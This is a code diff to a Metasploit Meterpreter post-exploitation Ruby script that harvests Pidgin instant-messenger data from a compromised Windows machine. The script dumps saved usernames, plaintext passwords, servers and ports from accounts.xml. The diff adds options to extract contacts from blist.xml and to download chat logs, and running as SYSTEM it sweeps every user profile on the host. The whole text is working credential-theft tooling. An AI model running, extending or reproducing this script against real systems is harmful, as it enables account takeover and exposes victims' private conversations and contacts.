@@ -7,17 +7,35 @@ require "rexml/document"
 #-------------------------------------------------------------------------------
 #Options and Option Parsing
 opts = Rex::Parser::Arguments.new(
-	"-h" => [ false, "Help menu." ]
+	"-h" => [ false, "Help menu." ],
+	"-c" => [ false, "Return credentials." ],
+	"-l" => [ false, "Retrieve logs." ],
+	"-b" => [ false, "Retrieve buddies." ]
 )
 
+get_credentials=false
+get_buddies=false
+get_logs=false
 opts.parse(args) { |opt, idx, val|
 	case opt
 	when "-h"
 		print_line "Meterpreter Script for extracting configured services with username and passwords."
 		print_line(opts.usage)
 		raise Rex::Script::Completed
+	when "-l"
+		get_logs=true
+	when "-b"
+		get_buddies=true
+	when "-c"
+		get_credentials=true
 	end
 }
+### If we get here and have none of our flags true, then we'll just
+###   get credentials
+if !(get_credentials || get_buddies || get_logs)
+	get_credentials=true
+end
+
 #-------------------------------------------------------------------------------
 #Set General Variables used in the script
 @client = client
@@ -26,11 +44,12 @@ host = @client.sys.config.sysinfo['Computer']
 # Create Filename info to be appended to downloaded files
 filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")+"-"+sprintf("%.5d",rand(100000))
 # Create a directory for the logs
-logs = ::File.join(Msf::Config.log_directory, 'winenum', host + filenameinfo )
+logs = ::File.join(Msf::Config.log_directory, 'im', host + filenameinfo )
 # Create the log directory
 ::FileUtils.mkdir_p(logs)
 #logfile name
 dest = logs + "/" + host + filenameinfo + ".txt"
+
 #-------------------------------------------------------------------------------
 #function for checking of Pidgin profile is present
 def check_pidgin(path)
@@ -38,51 +57,98 @@ def check_pidgin(path)
 	@client.fs.dir.foreach(path) do |x|
 		next if x =~ /^(\.|\.\.)$/
 		if x =~ (/.purple/)
-			found = true
+			### If we find the path, let's return it
+			found = path + x
+			return found
 		end
 	end
 	return found
 end
+
+#-------------------------------------------------------------------------------
+#function for extracting the buddies
+def extract_buddies(path)
+	blist_xml = ""
+	buddies = ""
+	print_status("Reading blist.xml file...")
+	### modified to use pidgin_path, which already has .purple in it
+	blist_file = @client.fs.file.new(path + "\\blist.xml", "rb")
+	until blist_file.eof?
+		blist_xml << blist_file.read
+	end
+	blist_file.close
+	doc = (REXML::Document.new blist_xml).root
+	doc.elements["blist"].elements.each("group") {|group|
+		group.elements.each("contact") {|contact|
+			b_name=contact.elements["buddy"].elements["name"].text + ""
+			b_account=contact.elements["buddy"].attributes["account"] + ""
+			b_proto=contact.elements["buddy"].attributes["proto"] + ""
+			b_alias=""
+			if (contact.elements["buddy"].elements["alias"])
+				b_alias=contact.elements["buddy"].elements["alias"].text
+			end
+			buddies << "buddy=>" + b_name + "\talias=>" + b_alias + "\taccount=>" + b_account + ":" + b_proto + "\n"
+		}
+	}
+	return buddies
+end
+
+#-------------------------------------------------------------------------------
+#function for downloading logs
+def download_logs(dest,pidgin_path)
+	begin
+		stat = client.fs.file.stat(pidgin_path+"\\logs")
+		if(stat.directory?)
+			print_status("downloading " + pidgin_path +"\\logs to " + dest+"/logs")
+			client.fs.dir.download(dest+"/logs", pidgin_path+"\\logs", true)
+		end
+	rescue
+		print_status("Log directory does not exist, loggin is not enabled.")
+	end
+end
+
 #-------------------------------------------------------------------------------
 #function for extracting the credentials
 def extract_creds(path)
 	accounts_xml = ""
 	creds = ""
 	print_status("Reading accounts.xml file...")
-	account_file = @client.fs.file.new(path + "\\.purple\\accounts.xml", "rb")
+	### modified to use pidgin_path, which already has .purple in it
+	account_file = @client.fs.file.new(path + "\\accounts.xml", "rb")
 	until account_file.eof?
 		accounts_xml << account_file.read
 	end
 	account_file.close
 	doc = (REXML::Document.new accounts_xml).root
 	doc.elements.each("account") {|element|
-		print_status("\tProtocol: #{element.elements["protocol"].text}")
-		creds << "#{element.elements["protocol"].text}"
-		print_status("\tUsername: #{element.elements["name"].text}")
-		creds << ":#{element.elements["name"].text}"
+		password = "<unknown>"
 		if element.elements["password"]
-			print_status("\tPassword: #{element.elements["password"].text}")
-			creds << ":#{element.elements["password"].text}\n"
-		else
-			print_status("\tPassword not Saved!")
-			creds << ":"
+			password=element.elements["password"].text
 		end
+
+		print_status("\tProtocol: #{element.elements["protocol"].text}")
+		print_status("\tUsername: #{element.elements["name"].text}")
+		print_status("\tPassword: #{element.elements["password"].text}")
 		print_status("\tServer: #{element.elements["settings"].elements["setting[@name='server']"].text}")
-		creds << ":#{element.elements["settings"].elements["setting[@name='server']"].text}"
 		print_status("\tPort: #{element.elements["settings"].elements["setting[@name='port']"].text}")
-		creds << ":#{element.elements["settings"].elements["setting[@name='port']"].text}"
 		print_status()
-		return creds
+
+		creds << "user=>#{element.elements["name"].text}"
+		creds << "\tpass=>#{password}"
+		creds << "\tserver=>#{element.elements["settings"].elements["setting[@name='server']"].text}"
+		creds << ":#{element.elements["settings"].elements["setting[@name='port']"].text}"
+		creds << "\tproto=>#{element.elements["protocol"].text}\n"
 	}
+	return creds
 end
 #-------------------------------------------------------------------------------
 #Function to enumerate the users if running as SYSTEM
 def enum_users(os)
 	users = []
-	userinfo = {}
 	user = @client.sys.config.getuid
 	path4users = ""
 	sysdrv = @client.fs.file.expand_path("%SystemDrive%")
+
 	if os =~ /7|Vista|2008/
 		path4users = sysdrv + "\\users\\"
 		path2purple = "\\AppData\\Roaming\\"
@@ -90,18 +156,21 @@ def enum_users(os)
 		path4users = sysdrv + "\\Documents and Settings\\"
 		path2purple = "\\Application Data\\"
 	end
+
 	if user == "NT AUTHORITY\\SYSTEM"
 		print_status("Running as SYSTEM extracting user list..")
 		@client.fs.dir.foreach(path4users) do |u|
-			next if u =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini)$/
+			userinfo = {}
+			next if u =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
 			userinfo['username'] = u
-			userinfo['userpath'] = path4users + u
+			userinfo['userappdata'] = path4users + u + path2purple
 			users << userinfo
 		end
 	else
+		userinfo = {}
 		uservar = @client.fs.file.expand_path("%USERNAME%")
 		userinfo['username'] = uservar
-		userinfo['userpath'] = path4users + uservar + path2purple
+		userinfo['userappdata'] = path4users + uservar + path2purple
 		users << userinfo
 	end
 	return users
@@ -119,13 +188,25 @@ def filewrt(file2wrt, data2wrt)
 end
 ################## MAIN ##################
 print_status("Running Meterpreter Pidgin Credential harvester script")
-print_status("All services are loged at #{dest}")
+print_status("All services are logged at #{dest}")
 enum_users(os).each do |u|
-	print_status("Checking if Pidgin profile is present for user #{u['username']}...")
-	if check_pidgin(u['userpath'])
-		print_status("Pidging profile found!")
-		filewrt(dest,extract_creds(u['userpath']))
+	print_status("Checking if Pidgin profile is present for user :::#{u['username']}:::...")
+	### Find the path (if it exists) for this user,
+	pidgin_path = check_pidgin(u['userappdata'])
+	if pidgin_path
+		print_status("Pidgin profile found!")
+		### modified to use pidgin_path
+		if get_credentials
+			filewrt(dest,extract_creds(pidgin_path))
+		end
+		if get_buddies
+			filewrt(dest,extract_buddies(pidgin_path))
+			print_status("Buddie list has been saved to the log file.")
+		end
+		if get_logs
+			download_logs(logs,pidgin_path)
+		end
 	else
-		print_error("Pidging profile not found!")
+		print_error("Pidgin profile not found!")
 	end
 end
